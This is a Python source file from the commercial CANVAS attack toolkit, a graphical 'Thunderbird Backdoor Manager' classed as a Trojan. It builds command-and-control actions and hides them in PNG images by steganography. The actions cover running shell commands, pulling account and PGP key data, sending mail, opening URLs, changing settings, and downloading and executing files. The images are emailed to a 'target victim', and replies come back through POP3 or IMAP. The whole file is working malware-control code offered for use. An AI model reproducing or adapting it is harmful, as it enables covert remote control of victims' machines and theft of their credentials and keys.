# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

"""
Action codes
------------
0 - RESET
1 - EXEC
2 - PGP INFO
3 - ACCOUNT INFO
4 - SEND MAIL
5 - OPEN URL
6 - READ SETTING
7 - CHANGE SETTING
8 - GET STATUS
9 - EXTRACT STEG DATA (this is not really an action. It's just used to analyze a response)

--------------------------------------------------------------------------------

Basic structure of an action
Only general and the needed attrs for each action should be added

action = {
    # general 
    "id" : "",
    "code" : "0",
    "output" : "0",
    "address" : "",
    
    # if action is EXEC
    "command" : "",
    "runshell" : "",
    "fixargs" : "",
    
    # if action is ACCOUNT INFO
    "email" : "", #If this is not provided it will get all by default
    
    # if action is SEND EMAIL (will take the address attr as destination)
    "subject" : "",
    "body" : "",
    
    # if action is OPEN URL (will take address attr as url)
    "method" : "",
    "data" : "",
    
    # if action is READ SETTING/CHANGE SETTING
    "pref" : "",
    
    # if action is CHANGE SETTING
    "value" : "",
    
    # if action is DOWNLOAD FILE FROM URL
    # uses general attrs address and filepath and then uses fixed method
    
    # "method": "GET", (fixed to GET)
    # "address": "http://www.test.com/file.exe",
    # "filepath": null, <!-- if null a random temp file will be asigned -->
    
    # if actgion is DOWNLOAD FILE FROM URL & EXECUTE 
    # same as download from url and then shares all attrs with EXEC action but with some fixed values
    
    # "command" : null, (means it has to use the filepath value) 
    # "runshell" : false, (fixed)
    # "fixargs" : true,
    
    }
--------------------------------------------------------------------------------
"""
#TODO:
#   - improve dialogs management to be able to get the results (ok or cancel) and then
#   validate if all needed fields were set

import os
import steg
import uuid
import gtk
import gtk.glade
import json
import socket
import tempfile
import base64
import timeoutsocket
import datetime
import traceback

try:
   import cPickle as pickle
except Exception:
   import pickle
   
import smtplib
import poplib
import imaplib
from email import Encoders
from email.MIMEBase import MIMEBase
from email.MIMEMultipart import MIMEMultipart
from email.mime.text import MIMEText
from email.Utils import formatdate
from email.parser import Parser
from random import choice

from exploitutils import *
from canvasexploit import canvasexploit
from canvaserror import *
from exploitmanager import *
from contextlib import contextmanager
from tb_utils import *
from ExploitTypes.localcommand import LocalCommand

from EmailConfigWindow import EmailConfigWindow
from IncomingEmailWindow import IncomingEmailWindow

NAME                     = "Mozilla Thunderbird Backdoor Manager"
DESCRIPTION              = "Mozilla Thunderbird Backdoor Manager"
VERSION                  = "1.0"
DOCUMENTATION            = {}
DOCUMENTATION["Notes"]   = """
This tool presents a GUI that lets you create and send actions
to remotelly control the Mozilla Thunderbird Backdoor.

You'll be able to select images in order to hide information
and automatically send emails to your target victim.
"""
DOCUMENTATION["Example"] = """"""
PROPERTY                 = {}
PROPERTY["TYPE"]         = "Trojans"
PROPERTY["SITE"]         =  "Remote"



def get_random_str(length=8):
    return ''.join([choice(string.letters) for i in xrange(length)])

class IncomingServer(object):
    def __init__(self, host, port, username, password, use_ssl=False):
        self._host     = host
        self._port     = port
        self._username = username
        self._password = password
        self._use_ssl  = use_ssl
        self._server   = None
        self._connect  = None
        # we'll keep downloaded messages here using the message id as key
        self.messages  = {} 
        
    def connect(self):
        if not self._connect: return False        
        with socket_timeout(TIMEOUT):
            try:
                self._server = self._connect(self._host, self._port)
                return self.login()
            except:
                pass
        return False

    def disconnect(self):
        """
        Subclasses should implement this.
        """
        raise Exception('Not implemented.')

    def get_msg(self, idx):
        """
        Subclassses should implement this.
        """
        raise Exception('Not implemented.')

    def get_msg_count(self):
        """
        Subclasses should implement this.
        """
        raise Exception('Not implemented.')
                    
    def login(self):
        """
        Subclasses should implement this.
        """
        raise Exception('Not implemented.')

    def get_new_msgs(self):
        """
        Get all messages from the server and store them locally.
        There is no universal way to get only what's "new"
        (sort of easy with IMAP, hard with POP) and i don't want to write
        an email client here. The email account linked to the manager should
        only be used for controlling the backdoor plus the user can always
        delete emails using an email client.
        """
        self.messages = {}
        
        count = self.get_msg_count()
        for i in xrange(1, count+1):
            msg = EmailMessage(self.get_msg(i))
            if msg.id not in self.messages:
                self.messages[msg.id] = msg

        
class IncomingPOP3Server(IncomingServer):    
    def __init__(self, host, port, username, password, use_ssl=False):
        IncomingServer.__init__(self, host, port, username, password, use_ssl)
        self._connect = poplib.POP3_SSL if use_ssl else poplib.POP3
    
    def login(self):
        if self._server is not None:
            res1 = self._server.user(self._username)
            res2 = self._server.pass_(self._password)
            return "OK" in res1 and "OK" in res2
        return False
    
    def disconnect(self):
        with socket_timeout(TIMEOUT):
            try:
                self._server.quit()
                self._server = None
            except Exception:
                pass
    
    def get_msg_count(self):
        with socket_timeout(TIMEOUT):
            try:
                return len(self._server.list()[1])
            except Exception:
                pass
        return 0
    
    def get_msg(self, num):
        with socket_timeout(TIMEOUT):
            try:
                msgdata = self._server.retr(num) # output is (response, ['line', ...], octets)
                msg = Parser().parsestr("\n".join(msgdata[1]))
                return msg
            except Exception:
                pass
        return None

    
class IncomingIMAPServer(IncomingServer):
    def __init__(self, host, port, username, password, use_ssl=False):
        IncomingServer.__init__(self, host, port, username, password, use_ssl)
        self._connect = imaplib.IMAP4_SSL if use_ssl else imaplib.IMAP4
    
    def login(self):
        if self._server is not None:
            self._server.login(self._username, self._password)
            self._server.select() # we always use INBOX
            return True
        return False
    
    def disconnect(self):
        with socket_timeout(TIMEOUT):
            try:
                self._server.logout()
                self._server = None
            except Exception:
                pass
        
    def get_msg_count(self):
        with socket_timeout(TIMEOUT):
            try:
                typ, msgnums = self._server.search(None, 'ALL')
                return len(msgnums[0].split())
            except Exception:
                pass
        return 0
        
    def get_msg(self, num):
        with socket_timeout(TIMEOUT):
            try:
                typ, data = self._server.fetch(num, '(RFC822)')
                msg = Parser().parsestr(data[0][1])
                return msg
            except Exception:
                pass
        return None
            

class EmailMessage(object):
    """
    Just a simple wrapper around
    email.message.Message (http://docs.python.org/library/email.message.html)
    Attachment attribute will only contain attachments which are png files
    all others will be ignored since are not useful for us.
    """
    def __init__(self, msg):
        self._msg        = msg
        self.Subject     = msg["Subject"]
        self.From        = msg["From"]
        self.Date        = msg["Date"]
        self.id          = msg["Message-ID"]
        self.Body        = ""
        self.Attachments = []

        if msg.is_multipart():
            payloads = msg.get_payload()
            # firt payload would be the msg body
            body = payloads[0]
            btext = body.get_payload()
            
            if isinstance(btext, str):
                self.Body = btext
            else:
                self.Body = btext[0].get_payload()
                
            for i in xrange(1, len(payloads)):
                msg = payloads[i]
                if "image/png" in msg["Content-Type"]: # we are only interested in png
                    b64image = msg.get_payload()
                    self.Attachments.append(b64image)
        else:
            self.Body = msg.get_payload()
            
            
    def __str__(self):
        return "Date: %s\nFrom: %s\nSubject: %s\nBody: %s\nAttachments: %d" %\
                (self.Date, self.From, self.Subject, self.Body, len(self.Attachments))

class EmailFieldsData(object):
    def __init__(self):
        self.To         = ""
        self.From       = ""
        self.Subject    = ""
        self.Body       = ""
    
    def load(self):
        try:
            f = open(EMAIL_FIELDS_FILE, "r")
            data = pickle.load(f)
            f.close()
            self.To         = data.To
            self.From       = data.From
            self.Subject    = data.Subject
            self.Body       = data.Body
        except Exception:
            pass
    
    def save(self):
        try:
            f = open(EMAIL_FIELDS_FILE, "w")
            pickle.dump(self, f, 2)
            f.close()
        except Exception:
            pass


class EmailConfiguration(object):
    def __init__(self):
        self.smtp_server       = ""
        self.smtp_port         = 25
        self.smtp_username     = ""
        self.smtp_password     = ""
        self.smtp_security     = SMTP_SEC_NONE
        self.incoming_type     = SERVER_POP3
        self.incoming_server   = ""
        self.incoming_port     = 110
        self.incoming_username = ""
        self.incoming_password = ""
        self.use_ssl           = False
        self.initialized       = False
    
    def load(self):
        try:
            f = open(EMAIL_CONFIG_FILE, "r")
            config = pickle.load(f)
            f.close()
            self.smtp_server        = config.smtp_server
            self.smtp_port          = config.smtp_port
            self.smtp_username      = config.smtp_username
            self.smtp_password      = config.smtp_password
            self.smtp_security      = config.smtp_security
            self.incoming_type      = config.incoming_type
            self.incoming_server    = config.incoming_server
            self.incoming_port      = config.incoming_port
            self.incoming_username  = config.incoming_username
            self.incoming_password  = config.incoming_password
            self.use_ssl            = config.use_ssl
            self.initialized        = True
        except Exception:
            self.initialized        = False
    
    def save(self):
        if self.initialized:
            try:
                f = open(EMAIL_CONFIG_FILE, "w")
                pickle.dump(self, f, 2)
                f.close()
            except Exception:
                pass
            
    def smtp_cred_equals_in_cred(self):
        return (self.incoming_username == self.smtp_username and
                self.incoming_password == self.smtp_password)
    
class BackdoorManager(object):
    def __init__(self, logging_callback=None):
        self._parameters_widgets = []
        self._actions_helper = {
            #[0 = dispatch method, 1 = Parameters UI class]
            "RESET"                            : [self._do_basic, ResetParams] ,
            "EXECUTE"                          : [self._do_execute, ExecuteParams],
            "GET PGP INFO"                     : [self._do_basic, PGPParams],
            "GET ACCOUNT INFO"                 : [self._do_account, AccountParams],
            "SEND EMAIL"                       : [self._do_email, EmailParams],
            "OPEN URL"                         : [self._do_url, URLParams],
            "READ SETTING"                     : [self._do_read_setting, ReadSettingParams],
            "CHANGE SETTING"                   : [self._do_change_setting, ChangeSettingParams],
            "GET STATUS"                       : [self._do_basic, StatusParams],
            "EXTRACT STEG DATA"                : [self._do_extract_data, ExtractDataParams],
        }

        self.stegger = None
        
        self.email_config = EmailConfiguration()
        self.email_config.load()
        self.email_fields_data = EmailFieldsData()
        self.email_fields_data.load()

        self.incoming_server       = None
        self.email_config_window   = None
        self.incoming_email_window = None
        
        self.custom_log = logging_callback
            
        self.load_gui()
    
    def log(self, msg):
        if self.custom_log is None:
            print "[BACKDOOR MANAGER] - %s - %s" % (datetime.datetime.now(), msg)
        else:
            self.custom_log(msg)

    def load_gui(self):
        self._wt = gtk.glade.XML(MAIN_GLADE_FILE)
        self.ui = UI(self._wt.get_widget)
        self.ui.window.set_title("Thunderbird Backdoor Manager")
        self.update_server()
        self.email_config_window = EmailConfigWindow(self, self.email_config, self.email_fields_data)
        self.incoming_email_window = IncomingEmailWindow(self)                             
        self.ui.generate_button.connect("clicked", self._generate)
        self.ui.config_email_button.connect("clicked", lambda w: self.email_config_window.show())
        self.ui.check_incoming_emails_button.connect("clicked", self._show_incoming_email_window)

        # create all the parameters widgets and set it to fixed in pos 0,0
        for action in valid_actions:
            self._parameters_widgets.append(
                self._actions_helper[action][1](self.ui.parameters_fixed))
            
        for w in self._parameters_widgets:
            self.ui.parameters_fixed.put(w, 0, 0)
            
        self._hide_all_parameter_widgets()        
        self._setup_actions()

    def update_server(self):
        self.incoming_server = self._create_incoming_server()

    def _show_incoming_email_window(self, widget):
        if self.incoming_server is None:
            self.ui.show_error("Incoming Email Server is not correctly configured", self.ui.window)
            return

        self.incoming_email_window.show()
        
    def _setup_actions(self):
        combo = self.ui.action_combobox
        combo.connect("changed", self._show_action_parameters)
        combo.get_model().clear()
        for action in valid_actions:
            combo.append_text(action)
    
    def _show_action_parameters(self, combo):
        # when an action is selected on the combo we need to
        # load the corresponding parameters on the ui
        # the ui.parameters_fixed has all the stacked widgets
        # so we need to make sure the correct one is raised
        action_code = combo.get_active()
        
        if action_code == 11:
            self.ui.spam_checkbutton.set_sensitive(False)
        else:
            self.ui.spam_checkbutton.set_sensitive(True)
            self.ui.spam_checkbutton.set_active(True)
            
        if action_code >= 0:
            # output is not used for certain actions
            if action_code in (0, 4, 5, 7, 9, 11):
                self.ui.address_entry.set_sensitive(False)
            else:
                self.ui.address_entry.set_sensitive(True)
                
            self._hide_all_parameter_widgets()
            widget = self._parameters_widgets[action_code]
            widget.show_all()
            
    def _check_output_widgets(self, combo):
        index = combo.get_active()
        self.ui.address_entry.set_sensitive(bool(index))
        if index != 1:
            self.ui.usebody_checkbutton.set_sensitive(False)
            self.ui.usebody_checkbutton.set_active(False)
        else:
            self.ui.usebody_checkbutton.set_sensitive(True)
        
    def _format_email_account(self, username, server):
        server = ".".join(server.split(".")[1:])
        mail_address = username if "@" in username else "@".join([username, server])
        return mail_address
    
    def _create_incoming_server(self):
        cfg = self.email_config

        if cfg.initialized and cfg.incoming_server and cfg.incoming_username and cfg.incoming_password:
            if cfg.incoming_type == SERVER_IMAP:
                server = IncomingIMAPServer
            else:
                server = IncomingPOP3Server
                
            # auto-complete the email address output field
            mail_address = self._format_email_account(cfg.incoming_username,
                                                      cfg.incoming_server)
            self.ui.address_entry.set_text(mail_address)
            return server(cfg.incoming_server,
                          cfg.incoming_port,
                          cfg.incoming_username,
                          cfg.incoming_password,
                          cfg.use_ssl)
            
    def start(self):
        self.ui.window.show_all()
        self.ui.action_combobox.set_active(1)
    
    def _hide_all_parameter_widgets(self):
        for w in self._parameters_widgets:
            w.hide_all()
            
    def _validate(self):
        """
       Checks if all the needed parameters were set on the ui
        """
        filename = self.ui.image_filechooser.get_filename()
        if filename is None:
            raise Exception('Please select an image that will carry the message via steganography.')
        extension = os.path.splitext(filename)[1].upper()
        if extension != ".PNG":
            raise Exception('Invalid file.\n\nOnly PNG images are currently supported.')
    
    def _generate(self, widget):
        """
        Reads all the parameters on the UI and builds a new action
        Then dupms the action to json format and uses a stegger obj
        to insert the information into the provided
        """
        try:
            self._validate()
            filename = self.ui.image_filechooser.get_filename()
            self.stegger = steg.ImageStegger(filename, logging_callback=self.custom_log)
            action_code = self.ui.action_combobox.get_active()
            action_name = valid_actions[action_code]
            # dispatch the corresponding method to handle the action
            action = self._actions_helper[action_name][0](self._get_basic_action(action_code),
                                            self._parameters_widgets[action_code])
            if action is not None:
                filename = self._steg_action(action)
                if filename is not None and self.ui.autosend_checkbutton.get_active():
                    email_sent = False
                    if not self.email_fields_data.To:
                        self.ui.show_error('Email fields are not correctly configured.\n'
                                           'Please set them in Email configuration before sending emails.')
                    else:
                        if self.sendEmail(attachment=filename):
                            msg = "Email with action ID:%s sent successfuly!" % action["id"]
                            self.log(msg)
                            self.ui.show_message(msg, self.ui.window)
                            email_sent = True
                    
                    if not email_sent:
                        msg = ("Automatic email could not be sent.\n"
                               "You can manually send the file %s" % filename)
                        self.log(msg)
                        self.ui.show_error(msg, self.ui.window)

        except Exception, ex:
            self.ui.show_error("An unexpected error ocurred while generating the action.\n"
                               "Details: " + str(ex), self.ui.window)
                               #"Details: " + traceback.format_exc(), self.ui.window)
    
    def _steg_action(self, action):
        filename = self.stegger.insert_data(json.dumps(action))
        if filename is not None:
            if not self.ui.autosend_checkbutton.get_active():
                msg = "Action (ID=%s) saved to steg image \"%s\"" % (action["id"], filename)
                self.log(msg)
                self.ui.show_message(msg, self.ui.window)
        else:
            self.ui.show_error("Data is too large to insert into the selected image",
                               self.ui.window)
        return filename
    
    def _get_basic_action(self, code):
        output = 1
        address = self.ui.address_entry.get_text() if output else ""
        usebody = self.ui.usebody_checkbutton.get_active()
        spam = self.ui.spam_checkbutton.get_active()
        return  {
                    #XXX: we could keep record of generated ids to filter incoming emails too
                    "id"        : str(uuid.uuid4()), 
                    "code"      : code,
                    "output"    : output,
                    "address"   : address,
                    "spam"      : spam,
                    "usebody"   : usebody,
                }
    
    def _do_basic(self, action, params_widget):
        return action
    
    def _do_execute(self, action, params_widget):
        cmd = params_widget.cmd_entry.get_text()
        runshell = params_widget.runshell_checkbox.get_active()
        fixargs = params_widget.fixargs_checkbox.get_active()
        action["command"] = cmd
        action["runshell"] = runshell
        action["fixargs"] = fixargs
        return action
    
    def _do_account(self, action, params_widget):
        action["email"] = params_widget.account_entry.get_text()
        return action
    
    def _do_email(self, action, params_widget):
        action["address"] = params_widget.to_entry.get_text()
        # Both cc and bcc are not implemented at the other end
        action["cc"] = ''
        action["bcc"] = ''
        action["subject"] = params_widget.subject_entry.get_text()
        action["body"] = self.ui.get_textview_text(params_widget.body_textview)
        #"attachment":null,
        return action
    
    def _do_url(self, action, params_widget):
        mindex = params_widget.method_combobox.get_active()
        method = http_methods[mindex]
        action["method"] = method
        action["url"] = params_widget.url_entry.get_text()
        action["data"] = self.ui.get_textview_text(params_widget.data_textview)
        return action
    
    def _do_read_setting(self, action, params_widget):
        action["pref"] = params_widget.pref_entry.get_text()
        return action
    
    def _do_change_setting(self, action, params_widget):
        action["pref"] = params_widget.pref_entry.get_text()
        action["value"] = params_widget.value_entry.get_text()
        return action

    def _do_extract_data(self, action, params_widget):
        data = self.stegger.extract_data()
        data = data if data else "No data was found..."
        self.ui.show_textview_dialog("Steg data", data, self.ui.window)
        return None
        
    def sendEmail(self, parent=None, attachment=None):
        win_ref = self.ui.window if not parent else parent
        if not self.email_config.initialized:
            self.ui.show_error("Email server configuration was not set. Please configure it.", win_ref)
            return False
        
        msg = MIMEMultipart()
        msg["From"] = self.email_fields_data.From
        msg["To"] = self.email_fields_data.To
        msg["Subject"] = self.email_fields_data.Subject
        msg['Date'] = formatdate(localtime=True)
        body = MIMEText(self.email_fields_data.Body, 'plain')
        msg.attach(body)

        if attachment:
            part = MIMEBase('image', "png") # fix attachment type since we know we only work with png files
            part.set_payload(open(attachment, "rb").read())
            Encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="%s"' % (get_random_str() + ".png") )
            msg.attach(part)
        
        try:
            # quick hack to use normal socket instead of timeoutsocket
            # starttls will try to run ssl.wrap_socket inside which fails with the timeoutsocket
            socket.socket = NO_TIMEOUTSOCKET
            smtp_server = smtplib.SMTP_SSL if self.email_config.smtp_security == SMTP_SEC_SSL else smtplib.SMTP
            server = smtp_server(self.email_config.smtp_server,
                                 self.email_config.smtp_port,
                                 timeout=TIMEOUT)
            
            socket.socket = TIMEOUTSOCKET_REF # revert change
            server.ehlo()
            if self.email_config.smtp_security == SMTP_SEC_TLS:
                server.starttls()
                server.ehlo()	
    
            server.login(self.email_config.smtp_username,
                         self.email_config.smtp_password)

            failed = server.sendmail(self.email_fields_data.From,
                                     self.email_fields_data.To,
                                     msg.as_string())
            server.close()
            return True
        except Exception, e:
            errorMsg = ("There was an error sending the email using server: %s and port: %s\n"
                        "Description: %s.\nPlease review your settings." %
                        (self.email_config.smtp_server, self.email_config.smtp_port, str(e)))
            self.log(errorMsg)
            self.ui.show_error(errorMsg, win_ref)
            return False
 
    
#-------------------------------------------------------------------------------    
# Parameter widget classes implementation
#-------------------------------------------------------------------------------
class ParametersWidget(gtk.VBox):
    def __init__(self, name, parent):
        gtk.VBox.__init__(self)
        self._name = name
        self._parent = parent
        
class ResetParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "RESET", parent)
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("This will cancel all pending actions on the backdoor"), False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)

class ExecuteParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "EXECUTE", parent)
        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Command        "), False, True, DEFAULT_PADDING)
        self.cmd_entry = gtk.Entry()
        self.cmd_entry.set_size_request(270, 24)
        hbox.pack_end(self.cmd_entry, False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
        hbox = gtk.HBox()
        self.runshell_checkbox = gtk.CheckButton("Run in shell")
        self.runshell_checkbox.set_tooltip_text("If this is not selected the command will run as a program and output won't be retrieved.")
        hbox.pack_start(self.runshell_checkbox, False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
        hbox = gtk.HBox()
        self.fixargs_checkbox = gtk.CheckButton("Fix parameters")
        self.fixargs_checkbox.set_tooltip_text("Check this if you want to automatically fix your \
command parameters quoting them when needed. This is only used if \"Run in shell\" was also selected.")
        hbox.pack_start(self.fixargs_checkbox, False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)

class PGPParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "GET PGP INFO", parent)
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Make sure the image you use to hide the action is big enough.\n\n\
PGP keys may not fit into small images and this would\nprevent you from getting the output."), False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
class AccountParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "GET ACCOUNT INFO", parent)
        self.account_entry = gtk.Entry()
        self.account_entry.set_size_request(270, 24)        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Account email  "), False, True, DEFAULT_PADDING)
        hbox.pack_end(self.account_entry, False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
                
class EmailParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "SEND EMAIL", parent)
        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("To               "), False, True, DEFAULT_PADDING)
        self.to_entry = gtk.Entry()
        self.to_entry.set_size_request(270, 24)
        hbox.pack_end(self.to_entry, True, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
                
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Subject       "), False, True, DEFAULT_PADDING)
        self.subject_entry = gtk.Entry()
        self.subject_entry.set_size_request(270, 24) 
        hbox.pack_end(self.subject_entry, True, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Body           "), False, True, DEFAULT_PADDING)
        self.body_textview = gtk.TextView()
        self.body_textview.set_size_request(270, 100)
        self.body_textview.set_wrap_mode(gtk.WRAP_WORD)
        self.body_textview.set_editable(True)
        self.body_textview.set_cursor_visible(True)	
        self.body_textview.set_border_window_size(gtk.TEXT_WINDOW_LEFT,0)
        self.body_textview.set_border_window_size(gtk.TEXT_WINDOW_RIGHT,0)
        self.body_textview.set_border_window_size(gtk.TEXT_WINDOW_TOP,0)
        self.body_textview.set_border_window_size(gtk.TEXT_WINDOW_BOTTOM,0)
        
        sw = gtk.ScrolledWindow()
        sw.set_policy(gtk.POLICY_AUTOMATIC, gtk.POLICY_AUTOMATIC)
        sw.set_border_width(1)
        sw.set_shadow_type(gtk.SHADOW_ETCHED_IN)
        sw.add(self.body_textview)
        hbox.pack_end(sw, True, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
    def get_body_text(self):
        textbuffer = self.body_textview.get_buffer()
        return textbuffer.get_text(textbuffer.get_start_iter() , textbuffer.get_end_iter())
        
class URLParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "OPEN URL", parent)
        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Method         "), False, True, DEFAULT_PADDING)
        self.method_combobox = gtk.combo_box_new_text()
        for m in http_methods:
            self.method_combobox.append_text(m)
        self.method_combobox.set_active(0)
        hbox.pack_end(self.method_combobox, True, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("URL            "), False, True, DEFAULT_PADDING)
        self.url_entry = gtk.Entry()
        self.url_entry.set_size_request(270, 24) 
        hbox.pack_end(self.url_entry, True, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Data           "), False, True, DEFAULT_PADDING)
        self.data_textview = gtk.TextView()
        self.data_textview.set_size_request(270, 100) 
        self.data_textview.set_wrap_mode(gtk.WRAP_WORD)
        self.data_textview.set_editable(True)
        self.data_textview.set_cursor_visible(True)	
        self.data_textview.set_border_window_size(gtk.TEXT_WINDOW_LEFT,0)
        self.data_textview.set_border_window_size(gtk.TEXT_WINDOW_RIGHT,0)
        self.data_textview.set_border_window_size(gtk.TEXT_WINDOW_TOP,0)
        self.data_textview.set_border_window_size(gtk.TEXT_WINDOW_BOTTOM,0)
        sw = gtk.ScrolledWindow()
        sw.set_policy(gtk.POLICY_AUTOMATIC, gtk.POLICY_AUTOMATIC)
        sw.set_border_width(1)
        sw.set_shadow_type(gtk.SHADOW_ETCHED_IN)
        sw.add(self.data_textview)
        hbox.pack_end(sw, True, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
class ReadSettingParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "READ SETTING", parent)
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Preference name"), False, True, DEFAULT_PADDING)
        self.pref_entry = gtk.Entry()
        self.pref_entry.set_size_request(270, 24)
        hbox.pack_end(self.pref_entry, False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
class ChangeSettingParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "CHANGE SETTING", parent)
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Preference name"), False, True, DEFAULT_PADDING)
        self.pref_entry = gtk.Entry()
        self.pref_entry.set_size_request(270, 24)
        hbox.pack_end(self.pref_entry, False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("New value"), False, True, DEFAULT_PADDING)
        self.value_entry = gtk.Entry()
        self.value_entry.set_size_request(270, 24)
        hbox.pack_end(self.value_entry, False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)
        
class StatusParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "GET STATUS", parent)
        
class ExtractDataParams(ParametersWidget):
    def __init__(self, parent):
        ParametersWidget.__init__(self, "EXTRACT STEG DATA", parent)
        hbox = gtk.HBox()
        hbox.pack_start(gtk.Label("Just select the image where data is hidden"), False, True, DEFAULT_PADDING)
        self.pack_start(hbox, False, True, 5)


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name    = NAME
        self.manager = None
        if not os.path.exists(BKD_RESOURCE_DIR): os.mkdir(BKD_RESOURCE_DIR)
        
    def run(self):
        self.log("Thunderbird Backdoor Manager running...")
        
        def startup():
            self.manager = BackdoorManager(logging_callback=self.log)
            self.manager.start()

        self.engine.gui.gui_queue_append("exploit_gui", [startup])
        return 1

if __name__ == '__main__':
    print ">>> This exploit must be run using CANVAS GUI <<<"
